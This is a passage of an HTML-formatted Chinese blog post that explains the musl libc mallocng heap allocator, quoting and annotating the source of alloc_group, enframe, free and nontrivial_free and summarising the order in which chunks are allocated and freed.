class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> meta *<span class="title function_">alloc_group</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> size = UNIT*size_classes[sc];</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line">    <span class="comment">// 优先寻找 freed_meta，将其从 ctx.free_meta_head 移除</span></span><br><span class="line">    <span class="comment">// 若没有就从 meta_area 中按地址从低到高顺序取一个</span></span><br><span class="line">    <span class="comment">// 如果 meta_area 满了，则再申请一个 meta_area</span></span><br><span class="line">    <span class="comment">// 会将 meta 的 prev，next 置零</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"><span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line"><span class="type">int</span> active_idx;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 设置 cnt，也就是 group 能容纳 chunk 最大数量 */</span></span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line"><span class="keyword">while</span> (i&lt;<span class="number">2</span> &amp;&amp; <span class="number">4</span>*small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">i++;</span><br><span class="line">cnt = small_cnt_tab[sc][i];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line"><span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line"><span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">cnt = med_cnt_tab[sc&amp;<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line"><span class="keyword">while</span> (!(cnt&amp;<span class="number">1</span>) &amp;&amp; <span class="number">4</span>*cnt &gt; usage)</span><br><span class="line">cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line"><span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line"><span class="keyword">while</span> (size*cnt &gt;= <span class="number">65536</span>*UNIT)</span><br><span class="line">cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line"><span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line"><span class="keyword">if</span> (cnt==<span class="number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="number">2</span>) cnt = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line"><span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line"><span class="keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="number">2</span>) &#123;</span><br><span class="line"><span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line"><span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line"><span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line"><span class="type">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">account_bounce(sc);</span><br><span class="line">step_seq();</span><br><span class="line"></span><br><span class="line"><span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line"><span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line"><span class="comment">// coarse usage as part of usage.</span></span><br><span class="line"><span class="keyword">if</span> (!(sc&amp;<span class="number">1</span>) &amp;&amp; sc&lt;<span class="number">32</span>) usage += ctx.usage_by_class[sc+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line"><span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line"><span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line"><span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">1</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">2</span> &amp;&amp; size*cnt&gt;<span class="number">4</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">2</span>*pagesize) cnt = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> needed = size*cnt + UNIT;</span><br><span class="line">needed += -needed &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line"><span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line"><span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line"><span class="keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="number">7</span>) &#123;</span><br><span class="line">req += IB + UNIT;</span><br><span class="line">req += -req &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="number">4</span>*pagesize &amp;&amp; <span class="number">2</span>*cnt&gt;usage)) &#123;</span><br><span class="line">cnt = <span class="number">1</span>;</span><br><span class="line">needed = req;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (p==MAP_FAILED) &#123;</span><br><span class="line">free_meta(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">m-&gt;maplen = needed&gt;&gt;<span class="number">12</span>;</span><br><span class="line">ctx.mmap_counter++;</span><br><span class="line">active_idx = (<span class="number">4096</span>-UNIT)/size<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (active_idx &gt; cnt<span class="number">-1</span>) active_idx = cnt<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> j = size_to_class(UNIT+cnt*size-IB);</span><br><span class="line">        <span class="comment">// 从大 group 中申请小 group，大 group 的 chunk 作为整个小 group，是一个递归过程</span></span><br><span class="line"><span class="type">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">free_meta(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);</span><br><span class="line">m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">p[<span class="number">-3</span>] = (p[<span class="number">-3</span>]&amp;<span class="number">31</span>) | (<span class="number">6</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;=cnt; i++)</span><br><span class="line">p[UNIT+i*size<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 增加可用 chunk 个数</span></span><br><span class="line">ctx.usage_by_class[sc] += cnt;</span><br><span class="line">    <span class="comment">// 初始化 meta 和 group</span></span><br><span class="line">m-&gt;avail_mask = (<span class="number">2u</span>&lt;&lt;active_idx)<span class="number">-1</span>;</span><br><span class="line">m-&gt;freed_mask = (<span class="number">2u</span>&lt;&lt;(cnt<span class="number">-1</span>))<span class="number">-1</span> - m-&gt;avail_mask;</span><br><span class="line">m-&gt;mem = (<span class="type">void</span> *)p;</span><br><span class="line">m-&gt;mem-&gt;meta = m;</span><br><span class="line">    <span class="comment">// group 的 active_idx 和 meta 的 last_idx 一般是相等的，为 cnt-1</span></span><br><span class="line">m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">m-&gt;last_idx = cnt<span class="number">-1</span>;</span><br><span class="line">m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">m-&gt;sizeclass = sc;</span><br><span class="line"><span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="emframe"><a href="#emframe" class="headerlink" title="emframe"></a>emframe</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">enframe</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> idx, <span class="type">size_t</span> n, <span class="type">int</span> ctr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取 chunk 大小</span></span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="comment">// 计算 chunk 多余空间</span></span><br><span class="line"><span class="type">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line"><span class="comment">// p 指向 chunk 的 data 起始位置</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = p+stride-IB;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line"><span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check */</span></span><br><span class="line"><span class="comment">// p[-3] = chunk_idx</span></span><br><span class="line"><span class="comment">// *(uint16_t *)(p-2) = chunk_offset</span></span><br><span class="line"><span class="comment">// 取 chunk 的 offset，一般为 0</span></span><br><span class="line"><span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">assert(!p[<span class="number">-4</span>]);</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line"><span class="type">size_t</span> m = slack;</span><br><span class="line">m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">off &amp;= m;</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">assert(off &lt;= slack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line"><span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">p += UNIT*off;</span><br><span class="line"><span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line"><span class="comment">// byte, so make one.</span></span><br><span class="line">p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 设置 offset 和 idx</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="type">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">p[<span class="number">-3</span>] = idx;</span><br><span class="line"><span class="comment">// 设置 reserved</span></span><br><span class="line">set_size(p, end, n);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>以下为一般情况的流程，省略了特殊情况</p><ol><li><strong>检查申请的 size</strong><ul><li>如果 size 达到需要 mmap 的阈值<ol><li>直接调用 mmap，返回的地址作为 group</li><li>获取并初始化 meta<ul><li>last_idx = 0，只有一个 chunk，因此它不会再 ctx.active 中</li><li>sizeclass = 63</li><li>maplen = (size + 4 + 0x10 + 4095) / 4096</li><li>avail_mask = freed_mask = 0</li><li>ctx.mmap_counter++</li></ul></li><li>进入 success</li></ol></li><li>没有则调用 <code>size_to_class</code> 将 size 计算为对应的 sc（sizeclass）</li></ul></li><li><strong>获取对应的 meta</strong><ol><li>取 sc 对应大小的可分配的 meta（ctx.active[sc])</li><li>若不存在满足下列所有条件会取稍大一点的 meta<ul><li>4&lt;= sc &lt;32</li><li>sc != 6</li><li>sc 为偶数</li><li>对应大小的所有 chunk 数量为 0（没有对应大小的 meta）</li></ul></li></ol></li><li><strong>获取 chunk 的 idx</strong><ol><li>取 meta 的第一个 avail_chunk<ul><li>若 avail_chunk 存在<ol><li>将 avail_mask 上对应的位置置零</li><li>进入 success</li></ol></li></ul></li><li>进入 <code>alloc_slot</code> 进行进一步申请<ol><li>调用 <code>try_avail</code> 尝试 ctx.active[sc] 链表中的所有 meta<ol><li>检查第一个 meta 的 freed_mask<ul><li>若 freed_mask 为 0，会调用 **<code>dequeue</code>**，将其移除 ctx.active[sc]</li><li>因为第一个 meta 没有 unuse_chunk</li></ul></li><li>将下一个 meta 切换为第一个 meta（ctx.active[sc] = m-&gt;next)</li><li>将 meta 的 freed_mask 转为 avail_mask</li><li>取 meta 的第一个 avail_chunk，将 avail_mask 上对应的位置置零</li><li>返回第一个 avail_chunk 对应的 avail_mask 位置</li><li><strong>注</strong>：下一个 meta 可能是它自己（循环），如果没有 unused_mask，最终会返回 0</li></ol></li><li>如果 <code>try_avail</code> 返回 0，会调用 <code>alloc_group</code> 申请一个新的 group<ol><li>先调用 <code>alloc_meta</code> 申请一个 meta，优先取 freed_meta 再从 meta_area 中取新的</li><li>新的 group 一般取更大的 chunk 作为整个 group，是一个递归过程</li><li>meta 的 avail_mask 减一，即使用第一个 chunk</li><li>调用 <code>queue</code> 将 meta 放入 ctx.active[sc]</li></ol></li></ol></li></ol></li><li><strong>进入 success</strong><ul><li>调用 <code>enframe</code> 对 chunk 初始化</li><li>(unsigned char*) p[-3] = idx</li><li>*(uint16_t) (p - 2) = offset</li><li>设置 reserved</li></ul></li></ol><h3 id="总结简单版"><a href="#总结简单版" class="headerlink" title="总结简单版"></a>总结简单版</h3><p><strong>分配 chunk 顺序</strong></p><ol><li>ctx.active[sc] -&gt; avail_mask<ul><li>malloc_context.active 对应大小的 meta 中的 avail_chunk</li></ul></li><li>ctx.active[sc] -&gt; next -&gt; freed_mask<ul><li>malloc_context.active 对应大小的 meta 的 下一个 meta 中的 freed_chunk</li><li>如果 ctx.active[sc] 的 chunk 都是 inuse，则会调用 **<code>dequeue</code>**，将其移出 active 和链表</li><li>先把 freed_mask 转为 avail_mask，然后将 ctx.active[sc] 设为该 meta</li></ul></li><li>ctx.active[sc] -&gt; freed_mask<ul><li>malloc_context.active 对应大小的 meta 中的 freed_chunk</li></ul></li><li>new_meta -&gt; avail_mask<ul><li>申请一个新的 meta，取其 avail_chunk</li></ul></li></ol><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line"><span class="comment">// 检查 reserved</span></span><br><span class="line">get_nominal_size(p, end);</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line"><span class="comment">// idx 和 reserved 置 0xff，offset 置 0</span></span><br><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line"><span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line"><span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line"><span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line"><span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">assert(!(mask&amp;self));</span><br><span class="line"><span class="comment">// 如果没有 freed_chunk 或者都是 unuse_chunk，则跳出循环</span></span><br><span class="line"><span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!MT)</span><br><span class="line">g-&gt;freed_mask = freed+self;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果其他 chunk 都不是 freed_chunk 或者都是 unuse_chunk 则会 进入 nontrivial_free</p><h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free"></a>nontrivial_free</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一般情况，只要所有 chunk 都是 unuse，就会 free meta 和 group</span></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="comment">// 将下一个 meta 的 freed_chunk 转为 avail_chunk</span></span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line"><span class="comment">// 如果 meta 不在 active 里，则放入 actvie 中</span></span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="comment">// might still be active if there were no allocations</span></span><br><span class="line"><span class="comment">// after last available slot was taken.</span></span><br><span class="line"><span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// g-&gt;freed_mask = g-&gt;free_mask &amp; self</span></span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>所有 chunk 都是 unuse_chunk<ol><li>将该 meta 从 active 和链表中移除</li><li>将链表的下一个 meta 的 freed_chunk 转为 avail_chunk</li><li>free 该 meta 和 group</li></ol></li><li>没有 freed_chunk<ol><li>将该 meta 插入 active 的链表尾部</li></ol></li></ul><h3 id="free-group"><a href="#free-group" class="headerlink" title="free_group"></a>free_group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span 